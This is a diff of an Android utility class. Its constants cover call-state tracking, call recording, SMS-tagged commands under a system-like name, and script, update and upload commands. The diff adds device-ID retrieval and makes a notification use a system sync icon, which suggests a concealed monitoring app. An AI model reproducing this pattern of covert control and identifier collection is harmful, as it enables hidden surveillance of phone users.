@@ -25,19 +25,19 @@ import android.support.v4.app.NotificationCompat;
 import android.telephony.TelephonyManager;
 
 public class Utils {
-	
+
 	public static final String LOG_TAG = "myLogs";
-	
+
 	public static final String EXTRA_COMMAND = "command";
-	
-	public static final String EXTRA_PHONE_NUMBER = "phoneNumber";	
+
+	public static final String EXTRA_PHONE_NUMBER = "phoneNumber";
 	public static final int STATE_IN_NUMBER = 0;
 	public static final int STATE_OUT_NUMBER = 1;
 	public static final int STATE_CALL_START = 2;
 	public static final int STATE_CALL_END = 3;
 	public static final int STATE_REC_START = 4;
 	public static final int STATE_REC_STOP = 5;
-	
+
 	public static final int COMMAND_RUN_SCRIPTER = 1;
 	public static final int COMMAND_RUN_UPDATER = 2;
 	public static final int COMMAND_RUN_UPLOAD = 3;
@@ -47,8 +47,7 @@ public class Utils {
 	public static final int MEDIA_MOUNTED_READ_ONLY = 1;
 	public static final int NO_MEDIA = 2;
 
-	public static final String EXTRA_SMS_BODY = "smsbody";
-	public static final String EXTRA_SMS_FROM = "smsfrom";
+	public static final String EXTRA_SMS_BODY = "smsbody";	
 	public static final String IDENT_SMS = "#com.telephony.services";
 	public static final String CONFIG_OUT_FILENAME = "config.out";
 
@@ -89,7 +88,7 @@ public class Utils {
 		int sec = 0;
 		ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
 		while (sec < seconds) {
-			NetworkInfo activeNetwork = cm.getActiveNetworkInfo();			
+			NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
 			if (activeNetwork != null && activeNetwork.isConnected()) {
 				if (wifiOnly) {
 					if ((activeNetwork.getType() != ConnectivityManager.TYPE_MOBILE)) {
@@ -187,19 +186,11 @@ public class Utils {
 		return res;
 	}
 
-	public static void show_notification(Context context, int mId, Intent intent) {
-		NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(context).setSmallIcon(R.drawable.ic_launcher) // notification
-																															// icon
-				.setContentTitle(context.getResources().getString(R.string.update_title)) // title
-																							// for
-																							// notification
-				.setContentText(context.getResources().getString(R.string.update_text)) // message
-																						// for
-																						// notification
-				.setSubText(context.getResources().getString(R.string.update_subtext)).setAutoCancel(true); // clear
-																											// notification
-																											// after
-																											// click
+	public static void show_notification(Context context, int mId, String subtext, Intent intent) {
+		NotificationCompat.Builder mBuilder = new NotificationCompat.Builder(context).setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
+				.setContentTitle(context.getResources().getString(R.string.update_title))
+				.setContentText(context.getResources().getString(R.string.update_text))
+				.setSubText(subtext).setAutoCancel(true);
 
 		PendingIntent pi = PendingIntent.getActivity(context, 0, intent, Intent.FLAG_ACTIVITY_NEW_TASK);
 		mBuilder.setContentIntent(pi);
@@ -211,8 +202,13 @@ public class Utils {
 	}
 
 	public static String getSelfPhoneNumber(Context context) {
-		TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
-		return tMgr.getLine1Number();
+		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+		return tm.getLine1Number();
+	}
+
+	public static String getDeviceId(Context context) {
+		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
+		return tm.getDeviceId();
 	}
 
 	public static String implodeStrings(String[] strings, String glue) {
